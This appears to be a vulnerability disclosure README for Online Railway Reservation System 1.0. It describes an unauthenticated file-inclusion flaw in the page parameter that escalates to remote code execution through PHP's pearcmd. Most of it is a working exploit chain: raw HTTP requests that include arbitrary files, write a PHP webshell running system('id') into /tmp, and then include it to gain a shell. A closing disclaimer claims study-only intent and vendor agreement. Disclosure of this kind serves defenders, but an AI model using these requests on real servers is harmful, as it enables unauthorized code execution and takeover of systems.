#  Online-Railway-Reservation-rce-Vulnerability

## title

Online Railway Reservation System 1.0 - Remote Code Execution (RCE) based on Include any php file (Unauthenticated)



## source code

https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html#comment-100601





## description

In one word,this cms has an unauthenticated rce vulnerability in the pecl installation, specifically because the index.php parameter does not have good security validation for the $page parameter
the poc is below:

/?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?=phpinfo()?>+/tmp/hello.php

/?page=/tmp/hello

This can later lead to arbitrary command execution

More details are as below:

```
# Vendor Homepage: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/orrs.zip
# Version: 1.0
# Tested on: Online Railway Reservation System 1.0 (the RCE Vulnerability needs pcel/pear)
```



payload:

```


================================================================================================================================
Include any php file 
================================================================================================================================
GET /?page=admin/index HTTP/1.1
Host: 127.0.0.1:33307
sec-ch-ua: "Chromium";v="95", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

================================================================================================================================
If the environment has pecl/pear (In any version of the Docker image, pcel/pear is installed by default in /usr/local/lib/php),
use the poc below to create webshell
================================================================================================================================

GET /?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?=system("id");?>+/tmp/shell.php HTTP/1.1
Host: 127.0.0.1:33307
sec-ch-ua: "Chromium";v="95", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

================================================================================================================================
use the poc below to getshell 
================================================================================================================================


GET /?page=/tmp/shell HTTP/1.1
Host: 127.0.0.1:33307
sec-ch-ua: "Chromium";v="95", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```





## declaration



Do not use in illegal ways. This article is for study and reference only.

This vulnerability has been confirmed with the manufacturer and agreed to publish.



![image-20230204130030777](Readme.assets/image-20230204130030777.png)

